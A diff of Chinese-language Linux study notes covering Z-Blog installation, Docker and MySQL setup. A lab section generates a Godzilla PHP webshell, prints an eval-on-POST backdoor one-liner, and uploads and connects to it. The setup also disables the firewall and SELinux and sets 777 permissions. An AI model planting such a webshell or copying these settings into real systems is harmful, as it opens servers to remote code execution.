@@ -59,7 +59,7 @@ Tip：伪静态-动态转为静态技术
 -
 >简单来说，就是让动态网页（通常是通过服务器端脚本语言生成内容、处理请求的网页，如基于 PHP、ASP.NET等开发的网页）在外观上呈现出静态网页（直接由 HTML 文件构成，内容相对固定，无需服务器端实时处理的网页）的形式，但其本质上依然是动态网页，只是通过一定的技术手段对 URL 进行改写，使其看起来更像静态网页。
 
->其实现原理主要是借助服务器端的相关模块或配置，当用户访问改写后的伪静态 URL 时，服务器会根据预设的规则将该 URL 解析还原成对应的动态网页请求，然后按照正常的动态网页处理流程，如执行脚本代码、查询数据库等操作，生成相应的网页内容并返回给用户。例如，原本一个动态网页的 URL 可能是 “example.com/index.php?id=123”，经过伪静态处理后变成了 “example.com/article/123.html”，从形式上看更简洁、更符合搜索引擎友好以及用户友好的特点。
+>其实现原理主要是借助服务器端的相关模块或配置，当用户访问改写后的伪静态 URL 时，服务器会根据预设的规则将该 URL 解析还原成对应的动态网页请求，然后按照正常的动态网页处理流程，如执行脚本代码、查询数据库等操作，生成相应的网页内容并返回给用户。例如，原本一个动态网页的 URL 可能是```example.com/index.php?id=123```，经过伪静态处理后变成了```example.com/article/123.html```，从形式上看更简洁、更符合搜索引擎友好以及用户友好的特点。
 
 实战
 -
@@ -70,7 +70,7 @@ Tip：伪静态-动态转为静态技术
 -
 ### 1.	安装Fedora Workstation  
 >https://fedoraproject.org/  
->选择WORKSTATION版本    
+>选择``Workstation``版本    
 ### 2.	安装所需的依赖。  
 ```bash
 dnf -y install httpd httpd-devel mysql mysql-server php php-mysqlnd php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-json php-mbstring php-bcmath php-mhash php-intl
@@ -106,22 +106,20 @@ systemctl stop firewalld
 ```bash
 vim /etc/selinux/config
 ```
->SELINUX=设置为disabled
+>```SELINUX=```设置为```disabled```
 ### 9.	下载zblog源码并上传  
->目录：/var/www/html
+>目录：```/var/www/html```
 ### 10.	设置zblog文件夹权限  
 ```bash
 chmod -R 777 /var/www/html/zblog
 ```
-### 11.	浏览器访问<http://ip:port/zblog/>
-### 12.	安装Zblog
+### 11.	安装Zblog
+浏览器打开```http://ip:port/zblog/```
 >输入Zblog php安装程序所需的信息，包括数据库名（先提前创建所需的数据库），数据库端口、用户名和密码，还有后台管理系统用户名和密码，根据提示安装zblog。
-### 13.	大功告成！
-### 14.	运行木马生成器
->下载ONE-FOX工具箱，运行哥斯拉v4.0.1
-### 15.	生成木马
->在哥斯拉v4.0.1，点击管理>生成 其他默认 有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.
-### 16.	一句话代码格式 
+### 12.	生成木马
+>下载ONE-FOX工具箱，运行哥斯拉v4.0.1  
+>在哥斯拉v4.0.1，点击管理>生成 其他默认 有效载荷选择PhpDynamicPayload，加密器选择PHP_EVAL_XOR_BASE64.
+### 13.	一句话代码格式 
 ```php 
 <?php @eval($_POST['cmd']); ?>
 ```
@@ -131,20 +129,26 @@ chmod -R 777 /var/www/html/zblog
 
 >$_POST['pass']：这是从 HTTP POST 请求中获取名为 “pass” 的变量值的方式。也就是说，攻击者会通过发送一个 POST 请求到包含这句代码的 PHP 文件所在的页面，并且在请求中携带名为 “pass” 的参数，其参数值就是攻击者想要执行的恶意 PHP 代码内容。
 
-### 17.	把php木马保存到你能找到的地方，并将其上传到服务器，在浏览器运行
-### 18.	点击目标 >添加 输入URL，有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.
-### 19.	点击测试连接，提示Success，然后点击添加
-### 20.	选中目标，右键进入，可以看到网站文件，但是看不到系统文件。 
+### 14.木马实验
+>把php木马保存到你能找到的地方，并将其上传到服务器，在浏览器运行  
+点击目标>添加 输入URL，有效载荷选择PhpDynamicPayload， 加密器选择PHP_EVAL_XOR_BASE64.  
+点击测试连接，提示Success，然后点击添加  
+选中目标，右键进入，可以看到网站文件，但是看不到系统文件。   
 
 Linux下终端全局代理
 -
->把代理服务器地址写入shell配置文件.bashrc或者.zshrc
+>把代理服务器地址写入shell配置文件```.bashrc```或者```.zshrc```
 ```bash
 export http_proxy="http://localhost:port"  
 export https_proxy="http://localhost:port" 
 ```
 在Fedora上部署docker
 -
+<i>Docker 是一个开源的应用容器引擎，用于开发、部署和运行应用程序，它基于 Go 语言 并遵从 Apache2.0 协议开源，它通过容器化技术，将应用程序及其依赖项打包在一个轻量级、可移植的容器中，使应用能在不同环境中一致运行。
+
+Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。
+
+容器是完全使用沙箱机制，相互之间不会有任何接口,更重要的是容器性能开销极低。</i>
 ### 1.	在你的Rocky Linux上添加docker存储库
 ```bash 
 sudo dnf -y install dnf-plugins-core，sudo dnf-3 config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo
@@ -157,19 +161,54 @@ sudo dnf -y install docker-ce docker-ce-cli containerd.io docker-compose-plugin
 ```bash
 sudo systemctl --now enable docker
 ```
-### 4.	配置代理 docker在国内需要魔法 
+### 4.	配置代理 <i>docker在国内需要魔法</i>
+>查找``` docker.service ```文件的位置
+```bash
+systemctl status docker
+```
+>输出中的``` Loaded ```行会显示``` docker.service ```的路径，例如：
+```
+Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
+```
+>编辑``` docker.service ```文件，在``` [Service] ```部分添加代理环境变量：
+```bash
+sudo vim /lib/systemd/system/docker.service
+```
+>在``` [Service] ```部分添加如下内容：
+```bash
+[Service]
+Environment="HTTP_PROXY=http://127.0.0.1:7890/"
+Environment="HTTPS_PROXY=http://127.0.0.1:7890/"
+```
+>保存并退出编辑器，重载``` docker.service ```配置并重启``` Docker ```服务：
+```bash
+sudo systemctl daemon-reload
+sudo systemctl restart docker
+```
 ### 5.  查看已经下载的镜像。
 ```bash
 docker images
 ```
-### 6.	<hub.docker.com>查看可用的镜像。
-### 7.	在hub.docker.com随便找一个镜像，可以查看命令，例如wordpress，可以使用（docker pull wordpress）拉取镜像
-### 8.	Image是镜像，当你每次运行一个实例，这个叫做容器
+### 6.	在```hub.docker.com```查看可用的镜像。
+该网站已被GFW，请自备梯子。
+### 7.	在hub.docker.com随便找一个镜像，可以查看命令，例如wordpress，可以使用（docker pull wordpress）拉取镜像,注意Image是镜像，当你每次运行一个实例，这个叫做容器
 ### 9.	可以使用（docker ps -a）来查看所有的“容器”，不管是正在运行的还是已经停止的。
 ### 10.	可以使用（docker stop id）停止容器
 ### 11.	可以使用（docker rm id）删除容器
 ### 12.	可以使用（docker rmi id）删除镜像
-### 13.	根据hub.docker.com上的提示创建“容器”
+
+Docker compose
+-
+<i>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</i>
+
+>在Docker目录中，执行以下命令来启动应用程序
+```bash
+docker-compose up
+```
+如果你想在后台执行该服务可以加上 ```-d``` 参数
+```bash
+docker-compose up -d
+```
 
 在Fedora中开启MySQL远程访问（外部连接）
 -
@@ -187,6 +226,6 @@ select host from user where user='root';
 update user set host = '%' where user ='root';  
 ```
 
->Host列指定了允许用户登录所使用的IP，比如user=root Host=192.168.1.1。这里的意思就是说root用户只能通过192.168.1.1的客户端去访问。 user=root Host=localhost，表示只能通过本机客户端去访问。而%是个通配符，如果Host=192.168.1.%，那么就表示只要是IP地址前缀为“192.168.1.”的客户端都可以连接。如果Host=%，表示所有IP都有连接权限。   
+>Host列指定了允许用户登录所使用的IP，比如```user=root``` ```Host=192.168.1.1```。这里的意思就是说root用户只能通过```192.168.1.1```的客户端去访问。 ```user=root``` ```Host=localhost```，表示只能通过本机客户端去访问。而%是个通配符，如果```Host=192.168.1.%```，那么就表示只要是IP地址前缀为```192.168.1.```的客户端都可以连接。如果```Host=%```，表示所有IP都有连接权限。   
 
 >注意：在生产环境下不能为了省事将host设置为%，这样做会存在安全问题，具体的设置可以根据生产环境的IP进行设置。
